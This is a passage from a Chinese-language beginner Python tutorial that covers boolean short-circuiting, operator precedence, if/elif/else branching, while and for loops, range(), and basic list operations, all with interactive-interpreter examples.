<li><code>or</code>  两边只要有一个是 True 那么结果就是 <strong>True</strong>.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 5 and 6         # 5 为True不能确定结果，继续执行 6 最终返回结果6</span><br><span class="line">6</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 5 or 6      # 5 为 Ture 可以确定结果，直接返回 5</span><br><span class="line">5</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 0 and 5     # 0 为 False 可以确定结果，直接返回 0</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 0 or 6      # 0 为 False 无法确定结果，继续执行 6 ，6 为True 返回结果 6</span><br><span class="line">6</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="6-运算符优先级"><a href="#6-运算符优先级" class="headerlink" title="6. 运算符优先级"></a>6. 运算符优先级</h2><p>这个表格从低到高（<strong>↓</strong>）列出了 Python 的运算符优先级：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>优先级</th>
<th style="text-align:center">运算符</th>
<th style="text-align:right">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td style="text-align:center">lambda</td>
<td style="text-align:right">Lambda表达式</td>
</tr>
<tr>
<td>2</td>
<td style="text-align:center">if - else</td>
<td style="text-align:right">条件表达式</td>
</tr>
<tr>
<td>3</td>
<td style="text-align:center">or</td>
<td style="text-align:right">布尔“或”</td>
</tr>
<tr>
<td>4</td>
<td style="text-align:center">and</td>
<td style="text-align:right">布尔“与”</td>
</tr>
<tr>
<td>5</td>
<td style="text-align:center">not x</td>
<td style="text-align:right">布尔“非”</td>
</tr>
<tr>
<td>6</td>
<td style="text-align:center">in, not in, is, is not, &lt;, &lt;=,&gt;, &gt;=, !=, ==</td>
<td style="text-align:right">成员测试，同一性测试，比较</td>
</tr>
<tr>
<td>7</td>
<td style="text-align:center">`</td>
<td style="text-align:right">`</td>
<td>按位或</td>
</tr>
<tr>
<td>8</td>
<td style="text-align:center">^</td>
<td style="text-align:right">按位异或</td>
</tr>
<tr>
<td>9</td>
<td style="text-align:center">&amp;</td>
<td style="text-align:right">按位与</td>
</tr>
<tr>
<td>10</td>
<td style="text-align:center">&lt;&lt;, &gt;&gt;</td>
<td style="text-align:right">移位</td>
</tr>
<tr>
<td>11</td>
<td style="text-align:center">+, -</td>
<td style="text-align:right">加法，减法</td>
</tr>
<tr>
<td>12</td>
<td style="text-align:center">*, @, /, //, %</td>
<td style="text-align:right">乘法，矩阵乘法，除法，地板除，取余数</td>
</tr>
<tr>
<td>13</td>
<td style="text-align:center">+x，-x, ~x</td>
<td style="text-align:right">正号，负号，按位翻转</td>
</tr>
<tr>
<td>14</td>
<td style="text-align:center">**</td>
<td style="text-align:right">指数</td>
</tr>
<tr>
<td>15</td>
<td style="text-align:center">await x</td>
<td style="text-align:right">Await表达式</td>
</tr>
<tr>
<td>16</td>
<td style="text-align:center">x[index], x[index:index],x(arguments…), x.attribute</td>
<td style="text-align:right">下标，切片，函数调用，属性引用</td>
</tr>
<tr>
<td>17</td>
<td style="text-align:center">(expressions…), [expressions…],{key: value…}, {expressions…}</td>
<td style="text-align:right">绑定或元组显示，列表显示，字典显示，集合显示</td>
</tr>
</tbody>
</table>
</div>
<h2 id="7-分支和循环-branch-and-loop"><a href="#7-分支和循环-branch-and-loop" class="headerlink" title="7. 分支和循环 (branch and loop)"></a>7. 分支和循环 (branch and loop)</h2><h3 id="7-1-分支结构"><a href="#7-1-分支结构" class="headerlink" title="7.1 分支结构"></a>7.1 分支结构</h3><p>Python 的分支结构由 if 语句来操刀实现。<br>if 语句总共有 5 钟语法结构，其中前 4 种是比较常见的。</p>
<p>第 1 种是判断一个条件，如果这个条件成立，就执行其包含的某条语句或某个代码块。<br>语法结构如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if 条件:</span><br><span class="line">    某条语句或某个代码块</span><br></pre></td></tr></table></figure></p>
<p>第 2 种同样是判断一个条件，跟第 1 种的区别是如果条件不成立，则执行另外的某条语句或某个代码块。<br>语法结构如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if 条件:</span><br><span class="line">    某条语句或某个代码块</span><br><span class="line">else:</span><br><span class="line">    某条语句或某个代码块</span><br></pre></td></tr></table></figure></p>
<p>第 3 种是判断多个条件，如果第 1 个条件不成立，则继续判断第 2 个条件，如果第 2 个条件还不成立，则接着判断第 3 个条件……<br>如果还有第 4、5、6、7、8、9 个条件，你还可以继续写下去。<br>语法结构如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if 第1个条件:</span><br><span class="line">    某条语句或某个代码块</span><br><span class="line">elif 第2个条件:</span><br><span class="line">    某条语句或某个代码块</span><br><span class="line">elif 第3个条件：</span><br><span class="line">    某条语句或某个代码块</span><br></pre></td></tr></table></figure></p>
<p>第 4 种是在第 3 种的情况下添加一个 else，表示上面所有的条件均不成立的情况下，执行某条语句或某个代码块。<br>语法结构如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if 第1个条件:</span><br><span class="line">    某条语句或某个代码块</span><br><span class="line">elif 第2个条件:</span><br><span class="line">    某条语句或某个代码块</span><br><span class="line">elif 第3个条件：</span><br><span class="line">    某条语句或某个代码块</span><br><span class="line">else:</span><br><span class="line">    某条语句或某个代码块</span><br></pre></td></tr></table></figure></p>
<p>第 5 种其实是一个条件表达式，相当于将一个完整的 if-else 结构整合成一个表达式来使用。<br>语法结构如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件成立时执行的语句 if 条件 else 条件不成立时执行的语句</span><br></pre></td></tr></table></figure><br>它把条件放正中间，然后左右紧挨着关键字 if 和 else，最左侧是条件成立时执行的语句，最右侧是条件不成立时执行的语句。<br>示例如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = 3</span><br><span class="line">&gt;&gt;&gt; b = 5</span><br><span class="line">&gt;&gt;&gt; small = a if a &lt; b else b</span><br><span class="line">&gt;&gt;&gt; print(small)</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p>
<h3 id="7-2-分支结构的嵌套-nested-branches"><a href="#7-2-分支结构的嵌套-nested-branches" class="headerlink" title="7.2 分支结构的嵌套(nested branches)"></a>7.2 分支结构的嵌套(nested branches)</h3><p>所谓嵌套，就是跟俄罗斯套娃一样，一层套一层。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; age = 18</span><br><span class="line">&gt;&gt;&gt; isGamer = True</span><br><span class="line">&gt;&gt;&gt; if age &lt; 18:</span><br><span class="line">...     print(&quot;抱歉，本游戏不适合未成年。&quot;)</span><br><span class="line">... else:</span><br><span class="line">...     if isGamer:</span><br><span class="line">...         print(&quot;游戏愉快！&quot;)</span><br><span class="line">...     else:</span><br><span class="line">...         print(&quot;抱歉，本游戏不适合非专业选手哦~&quot;)</span><br><span class="line"></span><br><span class="line">游戏愉快！</span><br></pre></td></tr></table></figure></p>
<h3 id="7-3-循环结构"><a href="#7-3-循环结构" class="headerlink" title="7.3 循环结构"></a>7.3 循环结构</h3><p>分支结构能让你的程序根据条件去做不同的事情，而循环机构能让你的程序去不断做同一件事情，这就是所谓的道不同而一样很牛逼啦！</p>
<p>Python 有两种循环语句：while 循环和 for 循环。</p>
<h4 id="7-3-1-while-循环"><a href="#7-3-1-while-循环" class="headerlink" title="7.3.1 while 循环"></a>7.3.1 <code>while</code> 循环</h4><p>它的语法结构结构如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while 条件:</span><br><span class="line">    某条语句或某个代码块</span><br></pre></td></tr></table></figure></p>
<p>只要条件一直成立，那么其包含的某条语句或某个代码块就会一直被执行。</p>
<h4 id="7-3-2-死循环"><a href="#7-3-2-死循环" class="headerlink" title="7.3.2 死循环"></a>7.3.2 死循环</h4><p>如果条件一直成立，那么循环体就一直被执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; while True:</span><br><span class="line">...     print(&quot;只要条件成立，我就循环到你死机！&quot;)</span><br></pre></td></tr></table></figure>
<p>像这种倔强的循环，我们给他起了一个不大好听的名字：死循环。<br>所谓的死循环，就是打死也不会结束的循环。</p>
<h4 id="7-3-3-break-语句"><a href="#7-3-3-break-语句" class="headerlink" title="7.3.3 break 语句"></a>7.3.3 <strong>break</strong> 语句</h4><p>在循环体内，一旦遇到 break 语句，Python 二话不说马上就会跳出循环体，即便这时候循环体内还有待执行的语句。</p>
<h4 id="7-3-4-continue-语句"><a href="#7-3-4-continue-语句" class="headerlink" title="7.3.4 continue 语句"></a>7.3.4 <strong>continue</strong> 语句</h4><p>实现跳出循环体还有另外一个语句，那就是 continue 语句。<br>continue 语句也会跳出循环体，但是，它只是跳出本一轮循环，它还会回到循环体的条件判断位置，然后继续下一轮循环（如果条件还满足的话）。</p>
<p>注意它和 break 语句两者的区别：</p>
<ul>
<li>continue 语句是跳出本次循环，回到循环的开头</li>
<li>break 语句则是直接跳出循环体，继续执行后面的语句<br><img src="/image/countine.jpg" alt="countine"></li>
</ul>
<h4 id="7-3-5-else-语句"><a href="#7-3-5-else-语句" class="headerlink" title="7.3.5 else 语句"></a>7.3.5 <strong>else</strong> 语句</h4><p>当循环的条件不再为真的时候，便执行 else 语句的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; i = 1</span><br><span class="line">&gt;&gt;&gt; while i &lt; 3:</span><br><span class="line">...     print(&quot;循环内，i 的值是&quot;, i)</span><br><span class="line">...     i += 1</span><br><span class="line">... else:</span><br><span class="line">...     print(&quot;循环外, i 的值是&quot;, i)</span><br><span class="line">... </span><br><span class="line">...     </span><br><span class="line">循环内，i 的值是 1</span><br><span class="line">循环内，i 的值是 2</span><br><span class="line">循环外, i 的值是 3</span><br></pre></td></tr></table></figure>
<p><strong><em>小技巧</em></strong></p>
<p>while-else 可以非常容易地检测到循环的退出情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; this = 1</span><br><span class="line">&gt;&gt;&gt; while this &lt;= 5:</span><br><span class="line">...     answer = input(&quot;是否this?&quot;)</span><br><span class="line">...     if answer != &quot;是&quot;:</span><br><span class="line">...         break</span><br><span class="line">...     this += 1</span><br><span class="line">... else:</span><br><span class="line">...     print(&quot;好的，你已经坚持了5次&quot;)</span><br><span class="line">... </span><br><span class="line">...     </span><br><span class="line">是否this?是</span><br><span class="line">是否this?是</span><br><span class="line">是否this?是</span><br><span class="line">是否this?否</span><br></pre></td></tr></table></figure>
<h4 id="7-3-6-嵌套"><a href="#7-3-6-嵌套" class="headerlink" title="7.3.6 嵌套"></a>7.3.6 嵌套</h4><p>循环也也可以嵌套，而且更简洁！</p>
<p>有时候，我们的需求可能要用到不止一层循环来实现。</p>
<p>比如我们要实现打印一个九九乘法表，就可以这么实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; i = 1</span><br><span class="line">&gt;&gt;&gt; while i &lt;= 9:</span><br><span class="line">...     j = 1</span><br><span class="line">...     while j &lt;= i:</span><br><span class="line">...         print(j, &quot;*&quot;, i, &quot;=&quot;, j * i, end=&quot; &quot;)</span><br><span class="line">...         j += 1</span><br><span class="line">...     print()</span><br><span class="line">...     i += 1</span><br><span class="line">...</span><br><span class="line">1 * 1 = 1 </span><br><span class="line">1 * 2 = 2 2 * 2 = 4 </span><br><span class="line">1 * 3 = 3 2 * 3 = 6 3 * 3 = 9 </span><br><span class="line">1 * 4 = 4 2 * 4 = 8 3 * 4 = 12 4 * 4 = 16 </span><br><span class="line">1 * 5 = 5 2 * 5 = 10 3 * 5 = 15 4 * 5 = 20 5 * 5 = 25 </span><br><span class="line">1 * 6 = 6 2 * 6 = 12 3 * 6 = 18 4 * 6 = 24 5 * 6 = 30 6 * 6 = 36 </span><br><span class="line">1 * 7 = 7 2 * 7 = 14 3 * 7 = 21 4 * 7 = 28 5 * 7 = 35 6 * 7 = 42 7 * 7 = 49 </span><br><span class="line">1 * 8 = 8 2 * 8 = 16 3 * 8 = 24 4 * 8 = 32 5 * 8 = 40 6 * 8 = 48 7 * 8 = 56 8 * 8 = 64 </span><br><span class="line">1 * 9 = 9 2 * 9 = 18 3 * 9 = 27 4 * 9 = 36 5 * 9 = 45 6 * 9 = 54 7 * 9 = 63 8 * 9 = 72 9 * 9 = 81 </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>注意</strong>: 对于嵌套循环来说，无论是 break 语句还是 continue 语句，它们只能作用于一层循环体。</li>
</ul>
<h4 id="7-3-7-for-循环"><a href="#7-3-7-for-循环" class="headerlink" title="7.3.7 for 循环"></a>7.3.7 <strong>for</strong> 循环</h4><p>语法结构如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 可迭代对象:</span><br><span class="line">    某条语句或某个代码块</span><br></pre></td></tr></table></figure></p>
<p>什么是可迭代对象？<br>所谓可迭代对象，就是指那些元素能够被单独提取出来的对象。比如我们学过的字符串，它就是一个可迭代对象。</p>
<p>什么叫迭代呢？<br>比如说让你每一次从字符串 “Mortal” 里面拿一个字符出来，那么你依次会拿出 ‘M’、’o’、’r’、’t’、’a’、’l’ 六个字符，这个过程我们称之为迭代。</p>
<h4 id="7-3-8-range"><a href="#7-3-8-range" class="headerlink" title="7.3.8 range()"></a>7.3.8 <strong>range()</strong></h4><p>range() 会帮你生成一个数字序列，它的用法有以下三种：</p>
<ul>
<li>range(stop) - 将生成一个从 0 开始，到 stop（不包含）的整数数列</li>
<li>range(start, stop) - 将生成一个从 start 开始，到 stop（不包含）的整数数列</li>
<li>range(start, stop, step) - 将生成一个从 start 开始，到 stop（不包含）结束，步进跨度为 step 的整数数列</li>
</ul>
<p><strong>注意</strong>：无论你使用哪一种，它的参数都只能是整数。</p>
<h4 id="7-3-9-for-循环和-while-循环的共通性"><a href="#7-3-9-for-循环和-while-循环的共通性" class="headerlink" title="7.3.9 for 循环和 while 循环的共通性"></a>7.3.9 for 循环和 while 循环的共通性</h4><p>for 循环和 while 循环一样，都是可以支持嵌套的，同样它也可以搭配 break 和 continue 语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for n in range(2, 10):</span><br><span class="line">...     for x in range(2, n):</span><br><span class="line">...         if n % x == 0:</span><br><span class="line">...             print(n, &quot;=&quot;, x, &quot;*&quot;, n // x)</span><br><span class="line">...             break</span><br><span class="line">...     else:</span><br><span class="line">...         print(n, &quot;是一个素数&quot;)</span><br><span class="line">...</span><br><span class="line">2 是一个素数</span><br><span class="line">3 是一个素数</span><br><span class="line">4 = 2 * 2</span><br><span class="line">5 是一个素数</span><br><span class="line">6 = 2 * 3</span><br><span class="line">7 是一个素数</span><br><span class="line">8 = 2 * 4</span><br><span class="line">9 = 3 * 3</span><br></pre></td></tr></table></figure>
<h2 id="8-列表"><a href="#8-列表" class="headerlink" title="8. 列表"></a>8. 列表</h2><h3 id="8-1-创建列表"><a href="#8-1-创建列表" class="headerlink" title="8.1 创建列表"></a>8.1 创建列表</h3><p>创建一个列表非常简单，我们只需要使用中括号，将所有准备放入列表中的元素给包裹起来，不同元素之间使用逗号分隔：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; rhyme = [1, 2, 3, 4, 5, &quot;上山打老虎&quot;]</span><br><span class="line">&gt;&gt;&gt; print(rhyme)</span><br><span class="line">[1, 2, 3, 4, 5, &#x27;上山打老虎&#x27;]</span><br></pre></td></tr></table></figure></p>
<h3 id="8-2-访问列表中的元素"><a href="#8-2-访问列表中的元素" class="headerlink" title="8.2 访问列表中的元素"></a>8.2 访问列表中的元素</h3><p>如果希望按顺序访问列表的每一个元素，可以使用 for 循环语句：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for each in rhyme:</span><br><span class="line">...     print(each)</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">上山打老虎</span><br></pre></td></tr></table></figure><br>如果希望随机访问其中一个元素，那么可以使用下标索引的方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; rhyme[0]</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; rhyme[2]</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; rhyme[5]</span><br><span class="line">&#x27;上山打老虎&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="8-3-下标索引"><a href="#8-3-下标索引" class="headerlink" title="8.3 下标索引"></a>8.3 下标索引</h3><p>序列类型的数据都可以使用下标索引的方法，第一个元素的下标是 0，第二个的下标是 1，以此类推：<br><img src="/image/下表索引1.jpg" alt="下表索引"><br>Python 还支持你 “倒着” 进行索引：<br><img src="/image/下表索引2.jpg" alt="下表索引2"></p>
<h3 id="8-4-列表切片"><a href="#8-4-列表切片" class="headerlink" title="8.4 列表切片"></a>8.4 列表切片</h3><p>将原先的单个索引值改成一个范围即可实现切片：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; rhyme[0:3]</span><br><span class="line">[1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; rhyme[3:6]</span><br><span class="line">[4, 5, &#x27;上山打老虎&#x27;]</span><br><span class="line">&gt;&gt;&gt; rhyme[:3]</span><br><span class="line">[1, 2, 3]</span><br><span class="line">&gt;&gt;&gt; rhyme[3:]</span><br><span class="line">[4, 5, &#x27;上山打老虎&#x27;]</span><br><span class="line">&gt;&gt;&gt; rhyme[:]</span><br><span class="line">[1, 2, 3, 4, 5, &#x27;上山打老虎&#x27;]</span><br><span class="line">&gt;&gt;&gt; rhyme[0:6:2]</span><br><span class="line">[1, 3, 5]</span><br><span class="line">&gt;&gt;&gt; rhyme[::2]</span><br><span class="line">[1, 3, 5]</span><br><span class="line">&gt;&gt;&gt; rhyme[::-2]</span><br><span class="line">[&#x27;上山打老虎&#x27;, 4, 2]</span><br><span class="line">&gt;&gt;&gt; rhyme[::-1]</span><br><span class="line">[&#x27;上山打老虎&#x27;, 5, 4, 3, 2, 1]</span><br></pre></td></tr></table></figure><br><strong>切片是一个非常棒的技能</strong></p>
<h3 id="8-5-列表的增删改查"><a href="#8-5-列表的增删改查" class="headerlink" title="8.5 列表的增删改查"></a>8.5 列表的增删改查</h3><h4 id="8-5-1-增（像列表添加数据）"><a href="#8-5-1-增（像列表添加数据）" class="headerlink" title="8.5.1 增（像列表添加数据）"></a>8.5.1 增（像列表添加数据）</h4><p>向列表添加元素可以使用 append() 方法，它的功能是在列表的末尾添加一个指定的元素。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; food.append(&quot;egg&quot;)</span><br><span class="line">&gt;&gt;&gt; food</span><br><span class="line">[&#x27;milk&#x27;, &#x27;bread&#x27;, &#x27;egg&#x27;]</span><br></pre></td></tr></table></figure>
<p>append() 方法虽好，不过每次它只能添加一个元素到列表中，而 extend() 方法则允许一次性添加多个元素：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; food.extend([&quot;cake&quot;, &quot;rice&quot;, &quot;vagetables&quot;])</span><br><span class="line">&gt;&gt;&gt; food</span><br><span class="line">[&#x27;milk&#x27;, &#x27;bread&#x27;, &#x27;egg&#x27;, &#x27;cake&#x27;, &#x27;rice&#x27;, &#x27;vagetables&#x27;]</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>注意：</strong>extend() 方法的参数必须是一个可迭代对象，然后新的内容是追加到原列表最后一个元素的后面。</li>
</ul>
<p>使用万能的切片语法，也可以实现列表元素的添加：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 2, 3, 4, 5]</span><br><span class="line">&gt;&gt;&gt; # 下面的做法等同于 s.append(6)</span><br><span class="line">&gt;&gt;&gt; s[len(s):] = [6]</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">[1, 2, 3, 4, 5, 6]</span><br><span class="line">&gt;&gt;&gt; # 下面的做法等同于 s.extend([7, 8, 9])</span><br><span class="line">&gt;&gt;&gt; s[len(s):] = [7, 8, 9]</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br></pre></td></tr></table></figure></p>
<p>insert() 方法允许你在列表的任意位置添加数据。<br>insert() 方法有两个参数，第一个参数指定的是插入的位置，第二个参数指定的是插入的元素：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = [1, 3, 4, 5]</span><br><span class="line">&gt;&gt;&gt; s.insert(1, 2)</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line">[1, 2, 3, 4, 5]</span><br></pre></td></tr></table></figure></p>
<h4 id="8-5-2-删（删除列表中的数据）"><a href="#8-5-2-删（删除列表中的数据）" class="headerlink" title="8.5.2 删（删除列表中的数据）"></a>8.5.2 删（删除列表中的数据）</h4><p>利用 remove() 方法，可以将列表中指定的元素删除：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; food.remove(&quot;vagetables&quot;)</span><br><span class="line">&gt;&gt;&gt; food</span><br><span class="line">[&#x27;milk&#x27;, &#x27;bread&#x27;, &#x27;egg&#x27;, &#x27;cake&#x27;, &#x27;rice&#x27;]</span><br></pre></td></tr></table></figure><br>有两点要注意：</p>
<ul>
<li>如果列表中存在多个匹配的元素，那么它只会删除第一个</li>
<li>remove() 方法要求你指定一个待删除的元素，如果指定的元素压根儿不存在，那么程序就会报错</li>
</ul>
<p>有时候我们可能需要删除某个指定位置上的元素，那么可以使用 pop() 方法，它的参数就是元素的下标索引值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; food.pop(0)</span><br><span class="line">&#x27;milk&#x27;</span><br><span class="line">&gt;&gt;&gt; food</span><br><span class="line">[&#x27;bread&#x27;, &#x27;egg&#x27;, &#x27;cake&#x27;, &#x27;rice&#x27;]</span><br></pre></td></tr></table></figure><br><code>pop()</code> 方法这个参数其实是可选的，如果你没有指定一个参数，那么它“弹”出来的就是最后一个元素：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; food.pop()</span><br><span class="line">&#x27;rice&#x27;</span><br><span class="line">&gt;&gt;&gt; food</span><br><span class="line">[&#x27;bread&#x27;, &#x27;egg&#x27;, &#x27;cake&#x27;]</span><br></pre></td></tr></table></figure></p>
<p>如果想要一步到位清空列表，可以使用 clear() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; food.clear()</span><br><span class="line">&gt;&gt;&gt; food</span><br><span class="line">[]</span><br></pre></td></tr></table></figure></p>
<h4 id="8-5-3-改（修改列表中的元素）"><a href="#8-5-3-改（修改列表中的元素）" class="headerlink" title="8.5.3 改（修改列表中的元素）"></a>8.5.3 改（修改列表中的元素）</h4><p>列表跟字符串最大区别就是：列表是可变的，而字符串是不可变的。<br>替换列表中的元素跟访问元素类似，都是使用下标索引的方法，然后使用赋值运算符就可以将新的值给替换进去了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; fruit = [&#x27;apple&#x27;, &#x27;apricot&#x27;, &#x27;cherries&#x27;, &#x27;coconut&#x27;, &#x27;mango&#x27;, &#x27;peach&#x27;]</span><br><span class="line">&gt;&gt;&gt; fruit[3] = &#x27;lychees&#x27;</span><br><span class="line">&gt;&gt;&gt; fruit</span><br><span class="line">[&#x27;apple&#x27;, &#x27;apricot&#x27;, &#x27;cherries&#x27;, &#x27;lychees&#x27;, &#x27;mango&#x27;, &#x27;peach&#x27;]</span><br></pre></td></tr></table></figure></p>
<p>如果有连续的多个元素需要替换，可以利用切片来实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; fruit[3:] = [&#x27;blackberries&#x27;, &#x27;cranberries&#x27;, &#x27;blueberries&#x27;]</span><br><span class="line">&gt;&gt;&gt; fruit</span><br><span class="line">[&#x27;apple&#x27;, &#x27;apricot&#x27;, &#x27;cherries&#x27;, &#x27;blackberries&#x27;, &#x27;cranberries&#x27;, &#x27;blueberries&#x27;]</span><br></pre></td></tr></table></figure></p>
<p><strong>排序与翻转</strong></p>
